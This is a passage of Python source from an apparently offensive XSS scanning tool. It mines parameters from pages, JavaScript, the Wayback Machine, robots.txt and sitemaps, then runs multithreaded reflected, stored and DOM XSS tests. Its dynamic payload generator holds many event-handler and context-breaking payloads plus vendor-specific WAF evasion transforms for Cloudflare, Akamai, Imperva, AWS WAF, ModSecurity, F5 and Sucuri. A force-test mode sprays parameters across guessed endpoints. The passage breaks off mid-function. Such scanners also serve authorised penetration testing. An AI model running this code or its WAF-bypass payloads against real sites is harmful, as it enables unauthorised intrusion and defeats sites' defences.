                                print(f"{Fore.CYAN}[+] API param: {Fore.WHITE}{param} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
                
                # Pattern: REST API path params like /api/users/:id or /api/users/{id}
                path_params = re.findall(r'/api/[^"\']*?[:{}]([a-zA-Z_][a-zA-Z0-9_]*)', js_code)
                for param in path_params[:10]:
                    self.found_params[base_url]['get'].add(param)
                    self.discovered_params.add(param)
    
    def _extract_event_handlers(self, url, soup):
        """Extract parameters from inline event handlers - ADVANCED"""
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        # Find all elements with event handlers
        event_attrs = ['onclick', 'onsubmit', 'onchange', 'onload', 'onerror', 'onfocus', 'onblur', 'onmouseover', 'onkeyup', 'onkeydown']
        
        all_elements = soup.find_all(True)
        for elem in all_elements:
            for attr in event_attrs:
                handler = elem.get(attr)
                if handler:
                    # Extract params from handler code
                    params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', handler)
                    params += re.findall(r'\.([a-zA-Z_][a-zA-Z0-9_]*)\s*=', handler)
                    for param in params[:5]:
                        if len(param) > 1 and len(param) < 30:
                            self.found_params[base_url]['get'].add(param)
                            self.discovered_params.add(param)
    
    def _extract_input_patterns(self, url, soup):
        """Extract parameters from input name patterns - ADVANCED"""
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        # Find all inputs, even hidden ones without forms
        all_inputs = soup.find_all(['input', 'textarea', 'select', 'button'])
        for inp in all_inputs:
            # Check name, id, data-name, data-param attributes
            for attr in ['name', 'id', 'data-name', 'data-param', 'data-field']:
                value = inp.get(attr)
                if value and len(value) > 1 and len(value) < 50:
                    self.found_params[base_url]['get'].add(value)
                    self.discovered_params.add(value)
        
        # Also check for hidden divs that might contain form-like structures
        hidden_divs = soup.find_all('div', {'style': re.compile(r'display:\s*none', re.I)})
        for div in hidden_divs:
            inputs = div.find_all(['input', 'textarea', 'select'])
            for inp in inputs:
                name = inp.get('name')
                if name:
                    self.found_params[base_url]['post'].add(name)
                    self.discovered_params.add(name)
                    if self.verbose:
                        print(f"{Fore.YELLOW}[+] Hidden input: {Fore.WHITE}{name} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
    
    def _extract_wayback_params(self, url):
        """Extract URLs and parameters from Wayback Machine archives - ADVANCED"""
        from urllib.parse import urlparse
        base_url = self._get_base_url(url)
        domain = urlparse(url).netloc
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        print(f"{Fore.CYAN}[*] Checking Wayback Machine for historical URLs...{Style.RESET_ALL}")
        
        discovered_wayback_urls = []
        ignored_extensions = [
            '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', 
            '.ttf', '.eot', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.zip', '.tar', '.gz', 
            '.mp3', '.mp4', '.avi', '.mov', '.xml', '.json', '.txt'
        ]
        
        try:
            # Query Wayback Machine CDX API for ALL URLs (up to 500)
            # filter=statuscode:200 to only get valid pages
            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=text&fl=original&filter=statuscode:200&limit=500"
            response = self.session.get(wayback_url, timeout=15, verify=False)
            
            if response.status_code == 200:
                found_count = 0
                lines = response.text.strip().split('\n')
                
                # Use a set to avoid duplicates immediately
                unique_urls = set()
                
                for line in lines:
                    full_url = line.strip()
                    if not full_url: 
                        continue
                        
                    # Skip static files based on extension
                    is_static = False
                    lower_url = full_url.lower().split('?')[0] # Check extension on path only
                    for ext in ignored_extensions:
                        if lower_url.endswith(ext):
                            is_static = True
                            break
                    
                    if is_static:
                        continue
                        
                    unique_urls.add(full_url)
                
                # Process the unique URLs
                for full_url in unique_urls:
                    discovered_wayback_urls.append(full_url)
                    
                    # Also extract parameters if present (legacy support)
                    if '?' in full_url:
                        try:
                            query_string = full_url.split('?')[1].split('#')[0]
                            for param_pair in query_string.split('&'):
                                if '=' in param_pair:
                                    param = param_pair.split('=')[0]
                                    if param and len(param) > 1 and len(param) < 30:
                                        if param not in self.discovered_params:
                                            self.found_params[base_url]['get'].add(param)
                                            self.discovered_params.add(param)
                                            found_count += 1
                        except:
                            pass
                
                if discovered_wayback_urls:
                    print(f"{Fore.GREEN}[+] Discovered {len(discovered_wayback_urls)} historical URLs from Wayback Machine!{Style.RESET_ALL}")
                    if found_count > 0:
                        print(f"{Fore.GREEN}[+] Also extracted {found_count} historical parameters{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[~] No relevant historical URLs found in archives{Style.RESET_ALL}")
                    
        except Exception as e:
             if self.verbose:
                print(f"{Fore.YELLOW}[~] Wayback Machine check skipped: {e}{Style.RESET_ALL}")
        
        return discovered_wayback_urls
    
    def _extract_robots_sitemap(self, url):
        """Extract URLs and parameters from robots.txt and sitemap.xml - ADVANCED"""
        from urllib.parse import urlparse, urljoin
        parsed = urlparse(url)
        base_domain = f"{parsed.scheme}://{parsed.netloc}"
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        found_urls = set()
        
        # Check robots.txt
        try:
            robots_url = f"{base_domain}/robots.txt"
            response = self.session.get(robots_url, timeout=10, verify=False)
            if response.status_code == 200:
                # Extract URLs from Disallow, Allow, Sitemap directives
                for line in response.text.split('\n'):
                    if ':' in line:
                        directive, value = line.split(':', 1)
                        value = value.strip()
                        if value.startswith('/'):
                            found_urls.add(urljoin(base_domain, value))
                        elif value.startswith('http'):
                            found_urls.add(value)
        except:
            pass
        
        # Check sitemap.xml
        try:
            sitemap_url = f"{base_domain}/sitemap.xml"
            response = self.session.get(sitemap_url, timeout=10, verify=False)
            if response.status_code == 200:
                # Extract URLs from sitemap
                urls = re.findall(r'<loc>(.*?)</loc>', response.text)
                for u in urls[:100]:
                    found_urls.add(u)
        except:
            pass
        
        # Extract parameters from found URLs
        found_count = 0
        for found_url in found_urls:
            if '?' in found_url:
                try:
                    query_string = found_url.split('?')[1].split('#')[0]
                    for param_pair in query_string.split('&'):
                        if '=' in param_pair:
                            param = param_pair.split('=')[0]
                            if param and len(param) > 1 and len(param) < 30:
                                if param not in self.discovered_params:
                                    self.found_params[base_url]['get'].add(param)
                                    self.discovered_params.add(param)
                                    found_count += 1
                except:
                    continue
        
        if found_count > 0:
            print(f"{Fore.GREEN}[+] Discovered {found_count} parameters from robots.txt/sitemap!{Style.RESET_ALL}")
    
    def _mine_reflected_params(self, url):
        """Mine for reflected parameters using smart wordlist - ADVANCED"""
        base_url = self._get_base_url(url)
        
        if base_url not in self.found_params:
            self.found_params[base_url] = {'get': set(), 'post': set()}
        
        # Extended smart parameter wordlist based on common vulnerabilities
        smart_params = [
            # Search & Query
            'q', 'query', 'search', 's', 'keyword', 'keywords', 'term', 'find',
            # User Input
            'name', 'username', 'user', 'email', 'mail', 'login', 'password',
            'pass', 'message', 'msg', 'text', 'content', 'comment', 'title',
            # Navigation & Routing
            'page', 'p', 'id', 'uid', 'pid', 'item', 'article', 'post', 'news',
            'category', 'cat', 'type', 'action', 'do', 'cmd', 'command', 'func',
            # URLs & Redirects
            'url', 'uri', 'link', 'href', 'src', 'dest', 'destination', 'redirect',
            'return', 'returnUrl', 'return_url', 'next', 'continue', 'goto', 'target',
            'redir', 'redirect_uri', 'callback', 'callback_url', 'ref', 'referer',
            # Files & Paths
            'file', 'filename', 'path', 'filepath', 'dir', 'folder', 'doc', 'document',
            'template', 'tpl', 'include', 'inc', 'load', 'read', 'fetch', 'get',
            # Data & Values
            'data', 'value', 'val', 'input', 'output', 'param', 'var', 'arg',
            'json', 'xml', 'html', 'body', 'payload', 'request', 'response',
            # View & Display
            'view', 'show', 'display', 'render', 'format', 'style', 'theme', 'lang',
            'language', 'locale', 'mode', 'debug', 'test', 'preview', 'print',
            # API & AJAX
            'api', 'ajax', 'method', 'module', 'controller', 'handler', 'service',
            'endpoint', 'token', 'key', 'apikey', 'api_key', 'access_token', 'auth',
            # Filters & Sorting
            'filter', 'sort', 'order', 'orderby', 'order_by', 'sortby', 'sort_by',
            'limit', 'offset', 'start', 'end', 'from', 'to', 'min', 'max', 'count',
        ]
        
        print(f"{Fore.CYAN}[*] Mining for reflected parameters ({len(smart_params)} patterns)...{Style.RESET_ALL}")
        
        found_count = 0
        test_value = 'reflect7890test'
        
        # Test in larger batches for speed
        batch_size = 20
        for i in range(0, len(smart_params), batch_size):
            batch = smart_params[i:i+batch_size]
            params = {p: test_value for p in batch}
            
            try:
                response = self.session.get(url, params=params, timeout=self.timeout, verify=False)
                
                if test_value in response.text:
                    # Found reflection! Test individually
                    for p in batch:
                        if p in self.discovered_params:
                            continue
                        try:
                            single_response = self.session.get(url, params={p: test_value}, timeout=self.timeout, verify=False)
                            if test_value in single_response.text:
                                self.found_params[base_url]['get'].add(p)
                                self.discovered_params.add(p)
                                found_count += 1
                                print(f"{Fore.GREEN}[+] Reflected param found: {Fore.WHITE}{p}{Style.RESET_ALL}")
                        except:
                            continue
            except:
                continue
        
        if found_count > 0:
            print(f"{Fore.GREEN}[+] Mined {found_count} reflected parameters!{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[~] No reflected parameters found via mining{Style.RESET_ALL}\n")
    
    def test_xss(self):
        """Test XSS payloads on discovered parameters"""
        # Check if we have any actual parameters (not just empty dict entries)
        total_params_found = sum(len(p['get']) + len(p['post']) for p in self.found_params.values())
        
        # If no params found but force_test is enabled, inject common params on multiple endpoints
        if total_params_found == 0 and self.force_test:
            print(f"\n{Fore.CYAN}[*] No parameters discovered. Force-testing common XSS parameters...{Style.RESET_ALL}")
            
            # Extended common test params
            common_test_params = [
                'q', 'query', 'search', 's', 'keyword', 'term', 'find',
                'id', 'page', 'p', 'cat', 'category', 'item', 'article',
                'name', 'email', 'user', 'username', 'login', 'password',
                'input', 'text', 'message', 'msg', 'comment', 'content', 'title', 'body',
                'url', 'redirect', 'return', 'next', 'goto', 'link', 'href', 'target',
                'file', 'path', 'doc', 'template', 'include', 'load',
                'cmd', 'action', 'do', 'func', 'callback', 'handler',
                'data', 'value', 'param', 'var', 'key', 'token',
                'view', 'show', 'display', 'render', 'format', 'lang', 'debug'
            ]
            
            # Common vulnerable endpoints to test
            common_endpoints = [
                '',              # Base URL
                '/search',
                '/search.php',
                '/find',
                '/query',
                '/results',
                '/contact',
                '/contact.php',
                '/feedback',
                '/comment',
                '/login',
                '/signin',
                '/register',
                '/signup',
                '/profile',
                '/user',
                '/page',
                '/article',
                '/news',
                '/blog',
                '/post',
                '/view',
                '/show',
                '/display',
                '/api',
                '/ajax',
                '/handler',
                '/action',
                '/process',
                '/submit',
            ]
            
            from urllib.parse import urlparse, urljoin
            parsed = urlparse(self.target)
            base_domain = f"{parsed.scheme}://{parsed.netloc}"
            
            # Add parameters to multiple endpoints
            endpoints_added = 0
            for endpoint in common_endpoints:
                endpoint_url = urljoin(base_domain, endpoint) if endpoint else base_domain
                base_url = self._get_base_url(endpoint_url)
                
                if base_url not in self.found_params:
                    self.found_params[base_url] = {'get': set(), 'post': set()}
                
                # Add common params to this endpoint
                self.found_params[base_url]['get'].update(common_test_params)
                endpoints_added += 1
            
            total_params_found = sum(len(p['get']) + len(p['post']) for p in self.found_params.values())
            print(f"{Fore.GREEN}[+] Injected {len(common_test_params)} params across {endpoints_added} endpoints for testing{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Total test combinations: {total_params_found} parameters{Style.RESET_ALL}")
        
        if total_params_found == 0:
            print(f"\n{Fore.YELLOW}+{'-'*68}+{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}|{' '*20}⚠️  NO PARAMETERS FOUND{' '*24}|{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}+{'-'*68}+{Style.RESET_ALL}")
            print(f"\n{Fore.CYAN}💡 Tip: Use --force-test to test common XSS parameters anyway{Style.RESET_ALL}")
            return
        
        payloads = self.get_payloads()
        payload_source = "CUSTOM" if self.custom_payloads else "BUILT-IN"
        total_params = sum(len(p['get']) + len(p['post']) for p in self.found_params.values())
        total_tests = total_params * len(payloads)
        
        # Check if WAF bypass mode is active (only when user explicitly requested it)
        is_waf_bypass = self.waf_bypass
        bypass_count = len(self.WAF_BYPASS_PAYLOADS) if is_waf_bypass else 0
        
        print(f"\n{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
        print(f"{Fore.CYAN}|{' '*18}🔍 XSS VULNERABILITY TESTING{' '*20}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
        
        # Dynamic padding calculation
        payload_line = f"Payloads:    {len(payloads)} ({payload_source})"
        param_line = f"Parameters:  {total_params}" 
        test_line = f"Total Tests: {total_tests}"
        
        padding_p = 68 - len(payload_line) - 2
        padding_par = 68 - len(param_line) - 2
        padding_t = 68 - len(test_line) - 2
        
        print(f"{Fore.CYAN}| {Fore.WHITE}{payload_line}{' '*max(0, padding_p)}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}| {Fore.WHITE}{param_line}{' '*max(0, padding_par)}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}| {Fore.WHITE}{test_line}{' '*max(0, padding_t)}|{Style.RESET_ALL}")
        
        # Show WAF bypass mode info if active
        if is_waf_bypass:
            waf_name = self.waf_detected if hasattr(self, 'waf_detected') and self.waf_detected else "Manual"
            waf_name_display = waf_name.upper() if isinstance(waf_name, str) else "DETECTED"
            print(f"{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
            print(f"{Fore.CYAN}| {Fore.MAGENTA}⚔️  WAF BYPASS MODE ACTIVE{' '*40}|{Style.RESET_ALL}")
            print(f"{Fore.CYAN}| {Fore.WHITE}Bypass Payloads: {Fore.YELLOW}{bypass_count:>3} {Fore.MAGENTA}(targeting: {waf_name_display[:20]}){' '*20}|{Style.RESET_ALL}")
            print(f"{Fore.CYAN}| {Fore.WHITE}Use {Fore.YELLOW}-v{Fore.WHITE} flag to see each bypass payload being tested{' '*11}|{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}\n")
        
        tested_params = 0
        vuln_found_count = len(self.vulnerabilities)
        
        for url, params in self.found_params.items():
            all_params = list(params['get']) + list(params['post'])
            if all_params:
                # Display URL being tested
                short_url = url[:60] + '...' if len(url) > 60 else url
                print(f"{Fore.BLUE}┌─ {Fore.WHITE}Testing: {Fore.CYAN}{short_url}{Style.RESET_ALL}")
            
            # Perform DOM XSS Check
            try:
                # We need fresh content for the base URL to check for DOM sinks
                if self.verbose:
                    print(f"{Fore.BLUE}│  {Fore.MAGENTA}⚔️  Analyzing for DOM XSS...{Style.RESET_ALL}")
                
                dom_resp = self.session.get(url, timeout=self.timeout, verify=False)
                dom_soup = BeautifulSoup(dom_resp.text, 'html.parser')
                
                dom_vulns = self._test_dom_xss(url, dom_soup)
                
                if dom_vulns:
                    print(f"{Fore.BLUE}│  {Fore.MAGENTA}⚔️  DOM XSS Analysis: {Fore.RED}[{len(dom_vulns)} POTENTIAL VULNS FOUND]{Style.RESET_ALL}")
                    for dv in dom_vulns:
                        # Construct proper vulnerability object
                        dom_vuln_data = {
                            'url': url,
                            'param': dv['source'],
                            'method': 'DOM',
                            'type': 'dom',
                            'full_url': dv.get('exploitation_url', url),
                            'payload': '<img src=x onerror=alert(1)>',
                            'severity': dv['severity'],
                            'context': f"{dv['source']} -> {dv['sink']}",
                            'is_waf_bypass': False
                        }
                        
                        # Add to vulnerabilities list
                        self.vulnerabilities.append(dom_vuln_data)
                        
                        # Print standard report
                        self._print_vuln_report(dom_vuln_data, len(self.vulnerabilities))
                elif self.verbose:
                    print(f"{Fore.BLUE}│  {Fore.MAGENTA}⚔️  DOM XSS Analysis: {Fore.GREEN}[CLEAN]{Style.RESET_ALL}")
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}│  [!] DOM analysis failed: {e}{Style.RESET_ALL}")
            
            # Test GET parameters
            for param in params['get']:
                tested_params += 1
                progress = f"[{tested_params}/{total_params}]"
                if self.deep_scan:
                    # Comprehensive testing for all XSS types
                    print(f"{Fore.BLUE}│  {Fore.YELLOW}{progress} {Fore.WHITE}GET  → {Fore.GREEN}{param} {Fore.CYAN}[Deep Scan]{Style.RESET_ALL}", end='\r')
                    results = self.test_all_xss_types(url, param, 'GET')
                    
                    found_vulns = 0
                    if results['reflected']: found_vulns += 1
                    if results['stored']: found_vulns += 1
                    
                    if found_vulns > 0:
                        vuln_found_count += found_vulns
                        print(f"{Fore.BLUE}│  {Fore.YELLOW}{progress} {Fore.WHITE}GET  → {Fore.GREEN}{param} {Fore.RED}[{found_vulns} VULNS FOUND!]{Style.RESET_ALL}")
                        
                        # Add found vulnerabilities to main list
                        for res in results['reflected']:
                            self.vulnerabilities.append({
                                'url': url, 'param': param, 'method': 'GET', 'type': 'reflected',
                                'payload': res['payload'], 'severity': res['severity'],
                                'context': res['context']
                            })
                        for res in results['stored']:
                            self.vulnerabilities.append({
                                'url': res['found_at'], 'param': param, 'method': 'GET', 'type': 'stored',
                                'payload': '<script>...</script>', 'severity': 'critical',
                                'context': 'stored_db'
                            })
                else:
                    # Standard testing
                    print(f"{Fore.BLUE}│  {Fore.YELLOW}{progress} {Fore.WHITE}GET  → {Fore.GREEN}{param}{Style.RESET_ALL}", end='\r')
                    self._test_param(url, param, 'GET')
                    # Check if new vulns found
                    if len(self.vulnerabilities) > vuln_found_count:
                        new_vulns = len(self.vulnerabilities) - vuln_found_count
                        vuln_found_count = len(self.vulnerabilities)
                        print(f"{Fore.BLUE}│  {Fore.YELLOW}{progress} {Fore.WHITE}GET  → {Fore.GREEN}{param} {Fore.RED}[{new_vulns} VULN FOUND!]{Style.RESET_ALL}")
            
            # Test POST parameters
            for param in params['post']:
                tested_params += 1
                progress = f"[{tested_params}/{total_params}]"
                if self.deep_scan:
                    # Comprehensive testing for all XSS types
                    print(f"{Fore.BLUE}│  {Fore.YELLOW}{progress} {Fore.WHITE}POST → {Fore.GREEN}{param} {Fore.CYAN}[Deep Scan]{Style.RESET_ALL}", end='\r')
                    results = self.test_all_xss_types(url, param, 'POST')
                    
                    found_vulns = 0
                    if results['reflected']: found_vulns += 1
                    if results['stored']: found_vulns += 1
                    
                    if found_vulns > 0:
                        vuln_found_count += found_vulns
                        print(f"{Fore.BLUE}│  {Fore.YELLOW}{progress} {Fore.WHITE}POST → {Fore.GREEN}{param} {Fore.RED}[{found_vulns} VULNS FOUND!]{Style.RESET_ALL}")
                        
                        # Add found vulnerabilities to main list
                        for res in results['reflected']:
                            self.vulnerabilities.append({
                                'url': url, 'param': param, 'method': 'POST', 'type': 'reflected',
                                'payload': res['payload'], 'severity': res['severity'],
                                'context': res['context']
                            })
                        for res in results['stored']:
                            self.vulnerabilities.append({
                                'url': res['found_at'], 'param': param, 'method': 'POST', 'type': 'stored',
                                'payload': '<script>...</script>', 'severity': 'critical',
                                'context': 'stored_db'
                            })
                else:
                    # Standard testing
                    print(f"{Fore.BLUE}│  {Fore.YELLOW}{progress} {Fore.WHITE}POST → {Fore.GREEN}{param}{Style.RESET_ALL}", end='\r')
                    self._test_param(url, param, 'POST')
                    # Check if new vulns found
                    if len(self.vulnerabilities) > vuln_found_count:
                        new_vulns = len(self.vulnerabilities) - vuln_found_count
                        vuln_found_count = len(self.vulnerabilities)
                        print(f"{Fore.BLUE}│  {Fore.YELLOW}{progress} {Fore.WHITE}POST → {Fore.GREEN}{param} {Fore.RED}[{new_vulns} VULN FOUND!]{Style.RESET_ALL}")
            
            if all_params:
                print(f"{Fore.BLUE}└─ {Fore.GREEN}✓ Complete{Style.RESET_ALL}")
                print()

    def _print_vuln_report(self, vuln_data, count):
        """Print a detailed vulnerability report card"""
        # Determine colors based on severity
        severity = vuln_data.get('severity', 'medium').upper()
        sev_color = Fore.YELLOW
        if severity == 'CRITICAL': sev_color = Fore.RED + Style.BRIGHT
        elif severity == 'HIGH': sev_color = Fore.RED
        elif severity == 'LOW': sev_color = Fore.GREEN
        
        # Determine context icon/text
        context = vuln_data.get('context', 'unknown').upper()
        
        # Determine Header
        vuln_type = vuln_data.get('type', 'reflected').upper()
        header_text = f"{vuln_type} XSS"
        
        if self.verbose:
            print(f"\n{Fore.RED}┌─ [{count}] {Style.BRIGHT}{header_text}{Style.RESET_ALL} ─ {sev_color}{severity} SEVERITY{Style.RESET_ALL}")
            print(f"{Fore.RED}│ {Fore.WHITE}🌐 URL: {Fore.BLUE}{vuln_data['url']}{Style.RESET_ALL}")
            print(f"{Fore.RED}│ {Fore.WHITE}📍 Parameter: {Fore.CYAN}{vuln_data['param']}{Style.RESET_ALL}")
            print(f"{Fore.RED}│ {Fore.WHITE}🔧 Method: {Fore.MAGENTA}{vuln_data['method']}{Style.RESET_ALL}")
            print(f"{Fore.RED}│ {Fore.WHITE}🎯 Context: {Fore.YELLOW}{context}{Style.RESET_ALL}")
            print(f"{Fore.RED}│ {Fore.WHITE}🚀 Payload: {Fore.GREEN}{vuln_data['payload']}{Style.RESET_ALL}")
            print(f"{Fore.RED}│ {Fore.WHITE}🔗 Test URL: {Fore.BLUE}{vuln_data['full_url']}{Style.RESET_ALL}")
            
            # WAF Bypass Indicator
            if vuln_data.get('is_waf_bypass'):
                print(f"{Fore.RED}│ {Fore.MAGENTA}⚔️  {Style.BRIGHT}WAF BYPASS SUCCESSFUL!{Style.RESET_ALL} {Fore.WHITE}(Payload skipped filters){Style.RESET_ALL}")
                
            print(f"{Fore.RED}│ {Fore.WHITE}📊 Confidence: {Fore.GREEN}Very High{Style.RESET_ALL}")
            print(f"{Fore.RED}│ {Fore.WHITE}🏷️  CVEs: {Fore.CYAN}CWE-79 (XSS){Style.RESET_ALL}{Fore.RED}") # Closing the box implicitly by color reset or next line
            print(f"{Fore.RED}└───────────────────────────────────────────────────────────────{Style.RESET_ALL}\n")
    
    def _test_single_payload(self, url, param, method, payload, is_waf_bypass):
        """Test a single payload (helper for threading)"""
        from urllib.parse import quote
        import threading

        try:
            encoded_payload = quote(payload, safe='')
            
            # Use shorter timeout for WAF bypass payloads to avoid tarpitting
            # Standard timeout for regular payloads
            request_timeout = 5 if is_waf_bypass else self.timeout
            
            if method == 'GET':
                # Build URL with payload
                test_url = f"{url}?{param}={encoded_payload}"
                encoded_url = test_url
                full_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=request_timeout, verify=False)
            else:
                # POST request with payload
                data = {param: payload}
                test_url = url
                full_url = f"{url} [POST: {param}={payload}]"
                encoded_url = f"{url}?{param}={encoded_payload}"
                response = self.session.post(url, data=data, timeout=request_timeout, verify=False)
            
            # Check if payload is reflected WITH TIMEOUT
            # Use threading to enforce a timeout on reflection checking
            # Reduced timeout for WAF bypass efficiency
            reflection_timeout = 2.0 if is_waf_bypass else 3.0
            
            reflection_result = [False]
            
            def check_with_timeout():
                try:
                    reflection_result[0] = self._check_reflection(response.text, payload)
                except Exception:
                    reflection_result[0] = False
            
            check_thread = threading.Thread(target=check_with_timeout, daemon=True)
            check_thread.start()
            check_thread.join(timeout=reflection_timeout)
            
            if check_thread.is_alive():
                 return None # Timeout
            
            if reflection_result[0]:
                # Classify the vulnerability
                classification = self._classify_xss_type(url, param, method, payload, response)
                
                # Check if this was a known WAF bypass payload
                is_special_bypass = payload in self.WAF_BYPASS_PAYLOADS
                
                return {
                    'url': url,
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'full_url': full_url,
                    'encoded_url': encoded_url,
                    'status_code': response.status_code,
                    'type': classification['type'],
                    'is_waf_bypass': is_special_bypass,
                    'context': classification['context'],
                    'severity': classification['severity']
                }
                
        except Exception:
            pass
            
        return None

    def _test_param(self, url, param, method):
        """Test a parameter with all XSS payloads using multithreading"""
        
        # Skip if we already found a vuln for this param (first_only mode)
        param_key = f"{url}|{param}|{method}"
        if self.first_only and param_key in self.tested_params:
            return True  # Already found vuln
        
        payloads = self.get_payloads()
        total_payloads = len(payloads)
        
        # Only consider it effective WAF bypass mode if we are actually using those payloads
        # (i.e., WAF was detected OR user force-enabled it - but our get_payloads logic now handles that)
        # We need to know if we are actually iterating over bypass payloads
        is_waf_bypass_active = self.waf_bypass and self.waf_detected
        
        # Determine thread count - higher for WAF bypass to speed it up
        max_workers = 15 if is_waf_bypass_active else 10
        
        found_vuln = False
        
        # Use ThreadPoolExecutor for concurrent payload testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_payload = {
                executor.submit(self._test_single_payload, url, param, method, p, is_waf_bypass_active): p 
                for p in payloads
            }
            
            completed_count = 0
            bypass_count = len(self.WAF_BYPASS_PAYLOADS) if is_waf_bypass_active else 0
            
            for future in concurrent.futures.as_completed(future_to_payload):
                completed_count += 1
                payload = future_to_payload[future]
                
                # Progress update logic
                if is_waf_bypass_active:
                     # Show more detailed progress for WAF bypass
                     if completed_count % 5 == 0 or completed_count == total_payloads:
                         print(f"{Fore.MAGENTA}    ├─ WAF Bypass / Payload Testing... [{completed_count}/{total_payloads}]{Style.RESET_ALL}", end='\r')
                
                try:
                    result = future.result()
                    if result:
                        self.vulnerabilities.append(result)
                        self.tested_params.add(param_key)
                        found_vuln = True
                        
                        # Print the report immediately
                        vuln_count = len(self.vulnerabilities)
                        self._print_vuln_report(result, vuln_count)
                        
                        # If first_only is set, we can cancel other futures or just return
                        # cancelling is hard with threads, but we can return early
                        if self.first_only:
                            executor.shutdown(wait=False)
                            return True
                            
                except Exception:
                    pass
        
        return found_vuln
    
    def _classify_xss_type(self, url, param, method, payload, response):
        """Classify the XSS vulnerability type - ADVANCED"""
        xss_type = 'reflected'  # Default
        context = 'unknown'
        severity = 'medium'
        
        # Detect context using the probe
        probe = f"XSS_PROBE_{hash(param) % 10000}"
        contexts = self._detect_context(response.text, payload)
        
        if contexts:
            context = contexts[0]['type']
            
            # Adjust severity based on context
            if context == 'javascript':
                severity = 'critical'
            elif context in ['event_handler', 'url_attribute']:
                severity = 'high'
            elif context == 'html_body':
                severity = 'medium'
            elif context in ['html_comment', 'css']:
                severity = 'low'
        
        return {
            'type': xss_type,
            'context': context,
            'severity': severity
        }
    
    def _generate_dynamic_payloads(self, url, sink_type='html', context=None):
        """Generate dynamic payloads based on target characteristics - ALWAYS ENABLED"""
        from urllib.parse import urlparse
        
        dynamic_payloads = []
        domain = urlparse(url).netloc
        
        # Base payloads that will be modified
        base_payloads = {
            'alert_variants': [
                ('alert', 'alert(1)'),
                ('prompt', 'prompt(1)'),
                ('confirm', 'confirm(1)'),
                ('console.log', 'console.log(1)'),
                ('print', 'print()'),
            ],
            'tags': [
                ('img', '<img src=x onerror={func}>'),
                ('svg', '<svg onload={func}>'),
                ('body', '<body onload={func}>'),
                ('video', '<video><source onerror={func}>'),
                ('audio', '<audio src onerror={func}>'),
                ('details', '<details open ontoggle={func}>'),
                ('marquee', '<marquee onstart={func}>'),
                ('input', '<input onfocus={func} autofocus>'),
                ('iframe', '<iframe srcdoc="<script>{func}</script>">'),
                ('object', '<object data="javascript:{func}">'),
                ('embed', '<embed src="javascript:{func}">'),
                ('math', '<math><maction xlink:href=javascript:{func}>X</maction></math>'),
            ],
            'context_break': [
                ('double_quote', '"><{tag}>'),
                ('single_quote', "'><{tag}>"),
                ('backtick', '`><{tag}>'),
                ('script_break', '</script><script>{func}</script>'),
            ],
        }
        
        # Determine WAF-specific evasions based on detected WAF
        waf_evasions = {
            'cloudflare': [
                lambda p: p.replace('alert', 'al\\x65rt'),
                lambda p: p.replace('(1)', '`1`'),
                lambda p: p.replace('onerror=', 'onerror\t='),
                lambda p: p.replace('<script>', '<scr\tipt>'),
            ],
            'akamai': [
                lambda p: p.replace('alert(1)', 'alert?.()'),
                lambda p: p.replace('javascript:', 'java\tscript:'),
                lambda p: p.replace('onerror', 'ONERROR'),
            ],
            'imperva': [
                lambda p: p.replace('alert', 'al\u200Bert'),
                lambda p: p.replace('script', 'scr\u200Bipt'),
                lambda p: p.replace('(1)', '(document.domain)'),
            ],
            'aws_waf': [
                lambda p: p.replace('<', '\u003C'),
                lambda p: p.replace('>', '\u003E'),
                lambda p: p.replace('alert(1)', 'window["alert"](1)'),
            ],
            'modsecurity': [
                lambda p: p.replace('alert(1)', 'alert(String.fromCharCode(49))'),
                lambda p: p.replace('script', 'Script'),
                lambda p: p.replace(' ', '/**/'),
            ],
            'f5_bigip': [
                lambda p: p.replace('alert', 'aler\\u0074'),
                lambda p: p.replace('<script', '<SCRIPT'),
            ],
            'sucuri': [
                lambda p: p.replace('alert(1)', 'top["al"+"ert"](1)'),
                lambda p: p.replace('onerror', 'oNeRrOr'),
            ],
            'generic': [
                lambda p: p.replace('(1)', '`1`'),
                lambda p: p.replace('alert', 'confirm'),
                lambda p: p.replace(' ', '/'),
                lambda p: p.replace('=', '\t='),
            ],
        }
        
        # === GENERATE PAYLOADS DYNAMICALLY ===
        
        # 1. Generate base payloads with different alert functions
        for func_name, func_call in base_payloads['alert_variants']:
            for tag_name, tag_template in base_payloads['tags']:
                payload = tag_template.replace('{func}', func_call)
                dynamic_payloads.append(payload)
        
        # 2. Generate context-breaking payloads
        for break_name, break_template in base_payloads['context_break']:
            for tag_name, tag_template in base_payloads['tags'][:3]:  # Use first 3 tags
                payload = break_template.replace('{tag}', tag_template.replace('{func}', 'alert(1)'))
                dynamic_payloads.append(payload)
        
        # 3. Apply WAF-specific evasions if WAF is detected
        waf_specific_payloads = []
        
        if self.waf_detected and self.waf_detected.lower() in waf_evasions:
            waf_key = self.waf_detected.lower()
            evasion_funcs = waf_evasions[waf_key]
            
